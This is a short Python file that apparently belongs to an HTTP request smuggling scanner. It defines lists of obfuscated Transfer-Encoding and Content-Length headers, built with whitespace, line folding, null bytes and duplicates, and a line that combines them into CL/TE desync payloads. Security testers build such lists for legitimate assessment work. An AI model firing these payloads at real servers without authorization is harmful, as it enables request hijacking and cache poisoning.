LISTS = {
    'te_headers': [
        'Transfer-Encoding: chunked',
        ' Transfer-Encoding: chunked',
        'Transfer-Encoding: xchunked',
        'Transfer-Encoding: identity, chunked',
        'Transfer-Encoding:\n chunked',
        'X-Haha:Lol\nTransfer-Encoding: chunked',
        'Transfer-Encoding : chunked',
        'Transfer-Encoding :\tchunked',
        'Transfer-Encoding: chunkedx',
        'Transfer-Encoding: chunked, identity',
        'Transfer-Encoding:\r\n chunked',
        'Transfer-Encoding: chunked,\r\n chunked',
        'Transfer-Encoding: identity,\r\n chunked',
        'X-Haha:\nTransfer-Encoding: chunked',
        'Transfer-Encoding\n: chunked',
        'Transfer-Encoding\r\n: chunked',
        'Transfer-Encoding: \x00chunked',
        'Transfer-Encoding: \\x00chunked',
        'Transfer-Encoding: ChUnKed',
        'Transfer-Encoding: chunked\r\nTransfer-Encoding: lolcat',
        'Transfer-Encoding: lolcat\r\nTransfer-Encoding: chunked',
        'TRANSFER_ENCODING: chunked', # think some py frameworks do this?
    ],
    'cl_headers': [
        ' Content-Length: CL',
        'Content-Length: 0CL',
        'Content-Length: 0, CL',
        'Content-Length:\n CL',
        'X-Haha:Lol\nContent-Length: CL',
    ],
}

# very simple way to match up cl/te headers
LISTS['obf_cl_te_headers'] = list(filter(lambda s: s != None, sum([
    [f'{LISTS["cl_headers"][i]}\r\n{LISTS["te_headers"][j]}' if i != j else None for i in range(len(LISTS['cl_headers']))] for j in range(7)
], [])))